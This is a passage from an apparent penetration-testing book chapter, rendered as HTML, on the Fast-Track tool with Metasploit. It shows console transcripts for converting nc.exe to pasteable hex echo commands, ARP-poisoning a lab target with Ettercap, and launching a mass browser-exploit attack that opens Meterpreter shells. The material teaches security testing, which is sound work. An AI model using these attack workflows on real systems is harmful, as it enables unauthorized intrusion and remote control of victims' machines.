  [*] Sleeping before handling stage...
  [*] Uploading DLL (718347 bytes)...
  [*] Upload completed.
<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> [*] Meterpreter session 1 opened (10.211.55.130:9090 -&gt; 10.211.55.128:1031)

  meterpreter &gt;</pre></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="binary-to-hex_generator">Binary-to-Hex Generator</h2></div></div></div><p class="calibre2">The binary-to-hex generator is useful when you already have access to a system and you want to deliver an executable to the remote file system. Point Fast-Track to the executable, and it will generate a text file that you can copy and paste to the target operating system. To convert the hexadecimal back to a binary and execute it, choose option 6 as shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13840" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> below.<a id="IDX-CHP-11-0057" class="strong"/><a id="IDX-CHP-11-0058" class="strong"/><a id="IDX-CHP-11-0059" class="strong"/></p><a id="I_programlisting11_d1e13857" class="strong"/><pre class="programlisting"><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> Enter the number: <strong class="calibre3"><code class="calibre6">6</code></strong>
  Binary to Hex Generator v0.1

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> Enter the path to the file you
 want to convert to hex: <strong class="calibre3"><code class="calibre6">/pentest/exploits/fasttrack/nc.exe</code></strong>

  Finished...
  Opening text editor...

  // Output will look like this

<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> DEL T 1&gt;NUL 2&gt;NUL
  echo EDS:0 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00&gt;&gt;T
  echo EDS:10 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00&gt;&gt;T
  echo FDS:20 L 10 00&gt;&gt;T
  echo EDS:30 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00&gt;&gt;T
  echo EDS:40 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68&gt;&gt;T
  echo EDS:50 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F&gt;&gt;T
  echo EDS:60 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20&gt;&gt;T
  echo EDS:70 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00&gt;&gt;T</pre><p class="calibre2">After selecting the <code class="literal">Binary to Hex Payload Converter</code>, point Fast-Track to the binary you want to convert at <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13890" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> and wait for the magic. At this point, you can simply copy and paste the output from <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13896" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> into an existing shell window.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="mass_client-side_attack">Mass Client-Side Attack</h2></div></div></div><p class="calibre2">The <span class="strong"><em class="calibre4">mass client-side attack</em></span> is similar to the <span class="strong"><em class="calibre4">Browser Autopwn</em></span> function; however, this attack includes additional exploits and built-in features that can incorporate ARP cache and DNS poisoning on the target’s machine, and additional browser exploits not included in Metasploit.<a id="IDX-CHP-11-0060" class="strong"/><a id="IDX-CHP-11-0061" class="strong"/><a id="IDX-CHP-11-0062" class="strong"/><a id="IDX-CHP-11-0063" class="strong"/><a id="IDX-CHP-11-0064" class="strong"/><a id="IDX-CHP-11-0065" class="strong"/><a id="IDX-CHP-11-0066" class="strong"/></p><p class="calibre2">When a user connects to your web server, Fast-Track will fire off every exploit in its arsenal as well as those in the Metasploit Framework. If the user’s machine is susceptible to a specific vulnerability within one of these libraries, the attacker will obtain full access to the target machine.</p><a id="I_programlisting11_d1e13939" class="strong"/><pre class="programlisting"><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> Enter the number: <strong class="calibre3"><code class="calibre6">4</code></strong>

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> Enter the IP Address you want the web server to listen on: <strong class="calibre3"><code class="calibre6">10.211.55.130</code></strong>

  Specify your payload:

  1. Windows Meterpreter Reverse Meterpreter
  2. Generic Bind Shell
  3. Windows VNC Inject Reverse_TCP (aka "Da Gui")
  4. Reverse TCP Shell

<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> Enter the number of the payload you want: <strong class="calibre3"><code class="calibre6">1</code></strong></pre><p class="calibre2">After selecting option 4, <code class="literal">Mass Client-Side Attack</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13975" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, from the main menu, tell Fast-Track what IP address the web server should listen on <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13981" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, and then choose a payload <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13987" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>.</p><p class="calibre2">Next, decide whether to use Ettercap to ARP-poison your target machine. Ettercap will intercept all requests that the target makes and redirect them to your malicious server. After confirming that you want to use Ettercap at <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e13995" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, enter the IP address of the target you want to poison <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e14001" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. Fast-Track will then go ahead and set up Ettercap <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e14007" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> for you.<a id="IDX-CHP-11-0067" class="strong"/></p><a id="I_programlisting11_d1e14016" class="strong"/><pre class="programlisting"><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> Would you like to use Ettercap to ARP poison a host yes or no: <strong class="calibre3"><code class="calibre6">yes</code></strong>

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> What IP Address do you want to poison: <strong class="calibre3"><code class="calibre6">10.211.55.128</code></strong>
  Setting up the ettercap filters....
  Filter created...
  Compiling Ettercap filter...

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> Filter compiled...Running Ettercap and poisoning target...</pre><p class="calibre2">Once a client connects to your malicious server, Metasploit fires exploits <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e14050" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> at the target. In the following listing, you can see that the Adobe exploit is successful, and a Meterpreter shell is waiting <span class="inlinemediaobject"><a id="I_inlinemediaobject11_d1e14056" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>.</p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">You could use ARP cache poisoning within this attack, but it will only work when you are on the same local and unrestricted subnet as the target.</p></div><div class="book"><hr class="calibre5"/></div><a id="I_programlisting11_d1e14065" class="strong"/><pre class="programlisting">[*] Local IP: http://10.211.55.130:8071/
  [*] Server started.
  [*] Handler binding to LHOST 0.0.0.0
  [*] Started reverse handler
  [*] Exploit running as background job.
  [*] Using URL: http://0.0.0.0:8072/
  [*] Local IP: http://10.211.55.130:8072/
  [*] Server started.
  msf exploit(zenturiprogramchecker_unsafe) &gt;
  [*] Handler binding to LHOST 0.0.0.0
  [*] Started reverse handler
  [*] Using URL: http://0.0.0.0:8073/
  [*] Local IP: http://10.211.55.130:8073/
  [*] Server started.
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> [*] Sending Adobe Collab.getIcon() Buffer Overflow to 10.211.55.128:1044...
  [*] Attempting to exploit ani_loadimage_chunksize
  [*] Sending HTML page to 10.211.55.128:1047...
  [*] Sending Adobe JBIG2Decode Memory Corruption Exploit to 10.211.55.128:1046...
  [*] Sending exploit to 10.211.55.128:1049...
  [*] Attempting to exploit ani_loadimage_chunksize
  [*] Sending Windows ANI LoadAniIcon() Chunk Size Stack Overflow (HTTP) to
       10.211.55.128:1076...
  [*] Transmitting intermediate stager for over-sized stage...(216 bytes)
  [*] Sending stage (718336 bytes)
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> [*] Meterpreter session 1 opened (10.211.55.130:9007 -&gt; 10.211.55.128:1077
  msf exploit(zenturiprogramchecker_unsafe) &gt; sessions -l

  Active sessions
  ===============

  Id Description Tunnel
  -- ----------- ------
  1 Meterpreter 10.211.55.130:9007 -&gt; 10.211.55.128:1077

  msf exploit(zenturiprogramchecker_unsafe) &gt; sessions -i 1
  [*] Starting interaction with 1...

  meterpreter &gt;</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="a_few_words_about_automation">A Few Words About Automation</h2></div></div></div><p class="calibre2">Fast-Track offers a plethora of exploitation capabilities that expand upon the feature-rich Metasploit Framework. When coupled with Metasploit it will allow you to use advanced attack vectors to fully control a target machine. Of course, automated attack vectors do not always succeed, which is why you must understand the system you are performing the attack against and ensure that when you attack it, you know its chances of success. If an automated tool fails, your ability to perform the tests manually and successfully attack the target system will make you a better penetration tester.</p></div></section></body></html>